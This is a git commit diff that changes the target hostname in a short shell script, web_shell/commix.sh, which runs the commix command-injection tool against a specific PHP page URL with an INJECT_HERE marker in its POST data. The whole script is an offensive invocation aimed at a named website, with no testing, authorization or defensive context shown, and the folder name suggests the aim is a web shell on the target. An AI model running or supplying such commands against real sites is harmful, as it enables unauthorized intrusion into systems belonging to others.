0f6f04fd618d065dec4a0429e06fb3cf20eacf3c
matheusam <38408536+matheusam@users.noreply.github.com>
2018-09-13 13:27:08 -0300

    Update commix.sh

--- web_shell/commix.sh
+++ web_shell/commix.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 cd /root/commix/;
-python commix.py --url="http://admig.com/servicos_item_pt.php?id=2" --data="id=INJECT_HERE&submit" --cookie="";
+python commix.py --url="http://admin.com/servicos_item_pt.php?id=2" --data="id=INJECT_HERE&submit" --cookie="";
